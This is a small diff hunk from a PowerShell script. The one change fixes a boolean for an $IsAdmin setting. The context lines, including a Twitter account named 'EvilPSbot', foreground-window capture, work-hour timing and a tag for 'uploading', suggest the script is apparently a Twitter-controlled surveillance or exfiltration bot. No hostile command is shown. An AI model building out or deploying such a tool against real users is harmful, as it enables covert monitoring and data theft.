@@ -836,7 +836,7 @@ public static extern IntPtr GetForegroundWindow();
             #$ErrorActionPreference = 2           
             [string] $TwitterUserName = 'EvilPSbot'
             [string] $EndDate = '2013-02-16'
-            [bool] $IsAdmin = '$False'
+            [bool] $IsAdmin = $False
             [string] $WorkStart = '09:00'
             [string] $WorkEnd = '17:00'
             #This string will be used to locate things that are tagged for uploading try '[System.Guid]::NewGuid().ToString()'
